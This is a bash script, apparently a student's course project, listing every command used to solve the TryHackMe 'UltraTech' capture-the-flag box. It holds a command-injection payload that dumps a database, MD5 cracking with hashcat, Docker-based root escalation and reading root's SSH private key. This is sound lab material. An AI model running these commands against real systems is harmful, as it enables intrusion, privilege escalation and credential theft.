#!/bin/bash
# ============================================================
# UltraTech CTF — All Commands (in order)
# Course: Intro to Computer Security — Final Project
# Platform: TryHackMe
# ============================================================

# ------------------------------------
# TASK 2: ENUMERATION
# ------------------------------------

# Nmap: Full port scan with service version detection
nmap -p- -sV 10.10.250.160

# Dirb: Web directory scan on Node.js service (port 8081)
dirb http://10.10.250.160:8081/

# Check robots.txt on Apache service (port 31331)
# Visit in browser: http://10.10.250.160:31331/robots.txt

# Check sitemap discovered in robots.txt
# Visit in browser: http://10.10.250.160:31331/utech_sitemap.txt

# View partners login page
# Visit in browser: http://10.10.250.160:31331/partners.html

# View api.js discovered in page source
# Visit in browser: http://10.10.250.160:31331/js/api.js

# ------------------------------------
# TASK 3: EXPLOITATION
# ------------------------------------

# Test command injection on /ping endpoint
# Visit in browser: http://10.10.250.160:8081/ping?ip=ls

# Extract SQLite database via command injection
# Visit in browser: http://10.10.250.160:8081/ping?ip=`cat utech.db.sqlite`

# Save extracted hashes to a file
cat > hashes.txt << 'EOF'
f357a0c52799563c7c7b76c1e7543a32
0d0ea5111e3c1def594c1684e3b9be84
EOF

# ------------------------------------
# TASK 4: HASH CRACKING & ROOT ACCESS
# ------------------------------------

# Crack MD5 hashes with Hashcat using rockyou wordlist
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# View cracked results
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show

# SSH into the target with cracked credentials
ssh <username>@10.10.250.160

# ------------------------------------
# POST-LOGIN: PRIVILEGE ESCALATION
# ------------------------------------

# Check current user and group memberships
id

# Check if Docker is running
docker ps

# Docker privilege escalation (GTFOBins technique)
# Substitutes 'bash' image for 'alpine' to get root shell
docker run -v /:/mnt --rm -it bash chroot /mnt sh

# ------------------------------------
# ROOT: EXTRACT SSH PRIVATE KEY
# ------------------------------------

# Verify root access
whoami

# Check UID/GID
id

# Navigate to root's SSH directory
cd /root/.ssh

# List contents
ls -la

# Print the private RSA key
cat id_rsa